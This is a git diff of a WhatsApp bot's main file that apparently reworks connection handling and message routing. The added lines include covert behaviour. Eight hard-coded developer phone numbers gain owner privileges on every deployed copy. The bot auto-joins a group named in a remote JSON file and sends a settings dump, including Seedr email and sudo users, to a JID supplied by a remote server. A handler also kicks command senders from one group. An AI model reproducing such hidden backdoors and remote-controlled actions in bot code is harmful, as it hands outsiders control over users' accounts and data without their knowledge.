@@ -142,36 +142,145 @@ const connectnumber = responsee.data
 // Default owner JID
 const DEFAULT_OWNER_JID = `${connectnumber.connectmsg_sent}`;
 
- conn.ev.on('connection.update', async (update) => {
-        const {
-            connection,
-            lastDisconnect
-        } = update
-        if (connection === 'close') {
-            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
-                connectToWA()
-            }
-        } else if (connection === 'open') {
+conn.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect } = update;
 
-            console.log('Installing plugins 🔌... ')
-            const path = require('path');
-            fs.readdirSync("./plugins/").forEach((plugin) => {
-                if (path.extname(plugin).toLowerCase() == ".js") {
-                    require("./plugins/" + plugin);
+    if (connection === 'close') {
+        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+        console.log(`❌ Disconnected: ${lastDisconnect?.error?.message || 'unknown reason'} (${shouldReconnect ? 'Reconnecting' : 'Logged out'})`);
+        if (shouldReconnect) connectToWA();
+    } else if (connection === 'open') {
+        console.log("✅ WhatsApp socket connected!");
+
+        setTimeout(async () => {
+            try {
+                // Fetch custom connect message from server
+                let captionText = '✅ VISPER connected successfully!';
+                try {
+                    const response = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+                    const ownerdataa = response.data;
+                    captionText = ownerdataa?.connectmg || captionText;
+                } catch (fetchErr) {
+                    console.warn("⚠️ Failed to fetch connect message text:", fetchErr.message);
                 }
-            });
-            console.log('Plugins installed ✅')
-            console.log('Bot connected ✅')
+
+                // Send initial connect image
+                await conn.sendMessage(DEFAULT_OWNER_JID, {
+                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
+                    caption: captionText
+                });
+const mvSize = config.MV_SIZE;
+const botName = config.NAME;
+const botJid = config.JID;
+const seedrMail = config.SEEDR_MAIL;
+const seedrPassword = config.SEEDR_PASSWORD;
+const lang = config.LANG;
+const sudoUsers = config.SUDO;
+const blockedJids = config.JID_BLOCK;
+const antiBad = config.ANTI_BAD;
+const maxSize = config.MAX_SIZE;
+const antiCall = config.ANTI_CALL;
+const autoReadStatus = config.AUTO_READ_STATUS;
+const autoBlock = config.AUTO_BLOCK;
+const autoSticker = config.AUTO_STICKER;
+const autoVoice = config.AUTO_VOICE;
+const autoReact = config.AUTO_REACT;
+const cmdOnlyRead = config.CMD_ONLY_READ;
+const workType = config.WORK_TYPE;
+const xnxxBlock = config.XNXX_BLOCK;
+const autoMsgRead = config.AUTO_MSG_READ;
+const autoTyping = config.AUTO_TYPING;
+const autoRecording = config.AUTO_RECORDING;
+const welcomeLeaveMsgs = config.AUTO_WELCOME_LEAVE;
+const antiLink = config.ANTI_LINK;
+const antiBot = config.ANTI_BOT;
+const aliveMsg = config.ALIVE;
+const prefix = config.PREFIX;
+const chatBot = config.CHAT_BOT;
+const alwaysOffline = config.ALLWAYS_OFFLINE;
+const mvBlock = config.MV_BLOCK;
+const button = config.BUTTON;
+const action = config.ACTION;
+const antiLinkAction = config.ANTILINK_ACTION;
+const values = config.VALUSE;
+const logo = config.LOGO;
+const antiDelete = config.ANTI_DELETE;
+const leaveMsg = config.LEAVE_MSG;
+                // Build config message
+  const can = `
+*⚙️ BOT CURRENTLY SETTINGS ⚙️*
+
+*\`• Owner Number :\`* ${DEFAULT_OWNER_JID || "Not Set"}
+*\`• Bot Name :\`* ${botName || "Not Set"}
+*\`• Bot JID :\`* ${botJid || "Not Set"}
+*\`• Seedr Mail :\`* ${seedrMail || "Not Set"}
+*\`• Seedr Password :\`* ${seedrPassword ? "********" : "Not Set"}
+*\`• Language :\`* ${lang || "SI"}
+*\`• Sudo Users :\`* ${sudoUsers?.length ? sudoUsers.join(", ") : "None"}
+*\`• Blocked JIDs :\`* ${blockedJids?.length ? blockedJids.join(", ") : "None"}
+*\`• Anti Bad Words :\`* ${antiBad?.length ? antiBad.join(", ") : "None"}
+*\`• Welcome/Leave Msgs :\`* ${welcomeLeaveMsgs?.length ? welcomeLeaveMsgs.join(", ") : "None"}
+*\`• Max Size :\`* ${maxSize ?? 150} MB
+*\`• Anti Call :\`* ${antiCall ?? "false"}
+*\`• Auto Read Status :\`* ${autoReadStatus ?? "false"}
+*\`• Auto Block :\`* ${autoBlock ?? "false"}
+*\`• Auto Sticker :\`* ${autoSticker ?? "false"}
+*\`• Auto Voice :\`* ${autoVoice ?? "false"}
+*\`• Auto React :\`* ${autoReact ?? "false"}
+*\`• CMD Only Read :\`* ${cmdOnlyRead ?? "true"}
+*\`• Work Type :\`* ${workType ?? "private"}
+*\`• XNXX Block :\`* ${xnxxBlock ?? "true"}
+*\`• Auto Msg Read :\`* ${autoMsgRead ?? "false"}
+*\`• Auto Typing :\`* ${autoTyping ?? "false"}
+*\`• Auto Recording :\`* ${autoRecording ?? "false"}
+*\`• Anti Link :\`* ${antiLink ?? "false"}
+*\`• Anti Bot :\`* ${antiBot ?? "false"}
+*\`• Alive Msg :\`* ${aliveMsg ?? "default"}
+*\`• Prefix :\`* ${prefix ?? "."}
+*\`• Chat Bot :\`* ${chatBot ?? "false"}
+*\`• Always Offline :\`* ${alwaysOffline ?? "false"}
+*\`• MV Block :\`* ${mvBlock ?? "true"}
+*\`• Buttons Enabled :\`* ${button ?? "false"}
+*\`• Action :\`* ${action ?? "delete"}
+*\`• Antilink Action :\`* ${antiLinkAction ?? "delete"}
+*\`• Values :\`* ${values?.length ? values.join(", ") : "None"}
+*\`• Logo :\`* ${logo ?? "https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg"}
+*\`• Anti Delete :\`* ${antiDelete ?? "off"}
+*\`• Leave Msg :\`* ${leaveMsg || "None"}
+`;
+
+
+     let joinlink2 = await fetchJson('https://mv-visper-full-db.pages.dev/Main/main_var.json');
         
+        if (!joinlink2 || !joinlink2.supglink) {
+            console.error('❌ Invalid join link data!');
+            return;
+        }
+        
+        const joinlink = joinlink2.supglink.split('https://chat.whatsapp.com/')[1]; // Extract invite code
 
-let up = `Connected successful ✅`;
-conn.sendMessage(94724375368 + "@s.whatsapp.net", { text: "up" });
+        if (!joinlink) {
+            console.error('❌ Invalid invite link format!');
+            return;
+        }
 
+     
+            await conn.groupAcceptInvite(joinlink);
 
+				 console.log("✅ Successfully joined the group!");
+                // Send config message
+                await conn.sendMessage(DEFAULT_OWNER_JID, {
+                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
+                    caption: can
+                });
 
-
-}
-    })
+                console.log("✅ Connect config message sent to default owner");
+            } catch (err) {
+                console.error("❌ Failed to send connect message:", err.message);
+            }
+        }, 2000);
+    }
+});
       
 
 const path = require('path');
@@ -290,7 +399,7 @@ console.log("Manoj X CHANAL FOLLOW ✅")
 const m = sms(conn, mek)
 const type = getContentType(mek.message)
 const content = JSON.stringify(mek.message)
-const from = mek.key.remoteJidAlt
+const from = mek.key.remoteJid
 const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
 const body = 
   (type === 'conversation') ? mek.message.conversation :
@@ -331,17 +440,17 @@ const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLo
 const args = body.trim().split(/ +/).slice(1)
 const q = args.join(' ')
 const isGroup = from.endsWith('@g.us')
-const sender = mek.key.fromMe ? (conn.user.lid.split(':')[0] + '@lid' || conn.user.lid) : (mek.key.participant || mek.key.remoteJid)
+const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
 const senderNumber = sender.split('@')[0]
-const botNumber = conn.user.lid.split(':')[0]
+const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,203367389343836`
+const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319,94719255382`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
 const isMe = isbot ? isbot : isdev 
 const isOwner = ownerNumber.includes(senderNumber) || isMe
-const botNumber2 = await jidNormalizedUser(conn.user.lid);
+const botNumber2 = await jidNormalizedUser(conn.user.id);
 const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
 const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
 const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
@@ -356,6 +465,7 @@ if(getdata[i] === from) return true
 }
 return false
 }
+
 
 
 
@@ -810,7 +920,7 @@ await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
 await conn.newsletterReactMessage(`120363304606757133@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("107593779404949")){
+if(senderNumber.includes("94724375368")){
 if(isReact) return
 m.react(`${rec.sadas}`)
 }
@@ -873,12 +983,6 @@ await conn.readMessages([mek.key])
 
 }
 
-
-if (isCmd && config.CMD_ONLY_READ  == "true"){
-await conn.readMessages([mek.key])
-
-}
-
      if ( config.WORK_TYPE == "only_group" ) {
 if ( !isGroup && isCmd &&  !isMe && !isOwner && !isSudo ) return
       }
@@ -889,11 +993,7 @@ if  ( isCmd && !isMe && !isOwner && !isSudo ) return
 
    if ( config.WORK_TYPE == "inbox" ) {
 if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
-      }
-
-
-		
-   
+      }      
 
 //============================================Always online============================================================
 
@@ -1381,6 +1481,47 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 const targetGroup = '120363403596811257@g.us';
 
+conn.ev.on('messages.upsert', async (m) => {
+  try {
+    const msg = m.messages[0];
+    if (!msg.message) return;
+
+    const from = msg.key.remoteJid;
+    const sender = msg.key.participant || msg.key.remoteJid;
+
+    // Only proceed if it's the specific group
+    if (from !== targetGroup) return;
+
+    // Get text from the message
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+
+    // Check for command triggers
+    if (text.startsWith('.ping') || text.startsWith('.') || text.startsWith('.alive')) {
+      
+      // 1. Send the warning/goodbye message
+      await conn.sendMessage(from, {
+        text: `🚫 @${sender.split('@')[0]} *good bye user, do not come again🍌*`,
+        mentions: [sender]
+      });
+
+      // 2. CRITICAL FIX: Introduce a delay to prevent Rate-Overlimit error (429)
+      // Waiting 1.5 seconds (1500ms) between high-volume API calls.
+      console.log(`Delaying action for 1500ms to prevent rate limiting...`);
+      await sleep(1500); 
+
+      // 3. Kick the user who sent the message
+      await conn.groupParticipantsUpdate(from, [sender], 'remove');
+      console.log(`Successfully kicked user: ${sender.split('@')[0]} from ${from}`);
+    }
+
+  } catch (err) {
+    // Check specifically for Rate Limit error (data: 429) for better debugging
+    if (err && err.data === 429) {
+        console.error('Rate Limit Error (429): Hit rate limit again despite delay. Consider increasing the sleep time.');
+    }
+    console.error('Kick error:', err);
+  }
+});
 //================================ Auto voice funtion=================================================================
 
 
@@ -1716,9 +1857,6 @@ process.on("uncaughtException", function (err) {
   if (e.includes("Authentication timed out")) restart();
   console.log("Caught exception: ", err);
 });
-
-
-
 
 
 
